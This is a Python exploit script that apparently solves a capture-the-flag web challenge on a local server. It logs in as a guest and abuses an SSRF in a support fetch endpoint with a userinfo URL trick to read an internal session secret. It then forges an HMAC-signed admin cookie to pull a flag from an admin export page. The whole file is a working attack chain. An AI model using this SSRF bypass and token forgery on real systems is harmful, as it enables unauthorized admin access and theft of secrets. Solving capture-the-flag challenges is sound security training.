#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import hmac
import http.cookiejar
import json
import os
import re
import urllib.parse
import urllib.request


FLAG_RE = re.compile(r"flag\{[a-zA-Z0-9_\-]+\}")


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def sign_token(payload: dict[str, str], secret: str) -> str:
    body = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
    encoded = b64u(body)
    signature = hmac.new(secret.encode("utf-8"), encoded.encode("utf-8"), hashlib.sha256).hexdigest()
    return f"{encoded}.{signature}"


def main() -> None:
    base_url = os.getenv("BASE_URL", "http://127.0.0.1:8080").rstrip("/")
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    login_body = urllib.parse.urlencode({"username": "guest"}).encode("utf-8")
    opener.open(urllib.request.Request(f"{base_url}/login", data=login_body, method="POST"), timeout=5).read()

    target = "http://relay.local@127.0.0.1:8080/internal/secret"
    fetch_url = f"{base_url}/support/fetch?url={urllib.parse.quote(target, safe='')}"
    secret_text = opener.open(fetch_url, timeout=5).read().decode("utf-8")
    match = re.search(r"SESSION_SECRET=([A-Za-z0-9_\-]+)", secret_text)
    if not match:
        raise SystemExit("session secret not found")
    secret = match.group(1)

    admin_token = sign_token({"role": "admin", "user": "auditor"}, secret)
    req = urllib.request.Request(f"{base_url}/admin/export")
    req.add_header("Cookie", f"session={admin_token}")
    text = urllib.request.urlopen(req, timeout=5).read().decode("utf-8")
    flag_match = FLAG_RE.search(text)
    if not flag_match:
        raise SystemExit("flag not found")
    print(flag_match.group(0))


if __name__ == "__main__":
    main()
